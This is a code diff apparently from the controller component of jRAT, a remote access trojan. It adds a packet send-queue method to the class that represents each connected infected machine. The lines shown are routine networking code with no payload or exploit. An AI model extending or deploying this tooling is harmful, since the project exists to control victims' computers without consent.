@@ -25,6 +25,7 @@ import su.jrat.client.exceptions.CloseException;
 import su.jrat.client.ip2c.Country;
 import su.jrat.client.net.ConnectionHandler;
 import su.jrat.client.net.PortListener;
+import su.jrat.client.packets.android.outgoing.AbstractOutgoingAndroidPacket;
 import su.jrat.client.packets.incoming.IncomingPackets;
 import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import su.jrat.client.packets.outgoing.Packet0Ping;
@@ -158,6 +159,26 @@ public class Slave extends AbstractSlave {
 			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
 			PluginEventHandler.onDisconnect(this);
 		}
+	}
+	
+	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
+		while (lock) {
+			try {
+				Thread.sleep(10L);
+			} catch (Exception ex) {
+				ex.printStackTrace();
+			}
+
+		}
+		try {
+			sendPacket(packet, dos);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+
+	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
+		packet.send(this, dos);
 	}
 
 	@Override
@@ -369,11 +390,6 @@ public class Slave extends AbstractSlave {
 
 	public Firewall[] getFirewalls() {
 		return firewalls;
-	}
-
-	@Override
-	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
-		packet.send(this, dos);
 	}
 
 	@Override
